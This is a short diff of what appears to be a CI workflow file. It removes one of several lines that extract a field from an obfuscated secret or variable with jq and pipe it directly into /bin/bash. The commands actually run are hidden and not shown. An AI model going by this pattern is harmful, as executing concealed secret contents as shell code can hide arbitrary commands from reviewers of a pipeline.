@@ -23,7 +23,6 @@ jobs:
           dwpt79280: ${{ secrets.dwpt79280 }}
         run: |
           printf '%s' "$dwpt79280" | jq -r .int9779 | /bin/bash
-          echo $enog7643 | jq -r .sbhy884 | /bin/bash
           echo $giuz96 | jq -r .e3 | /bin/bash
           printf '%s' "$sg976" | jq -r .kpv61 | /bin/bash
           echo $dspj3 | jq -r .eveii9686 | /bin/bash
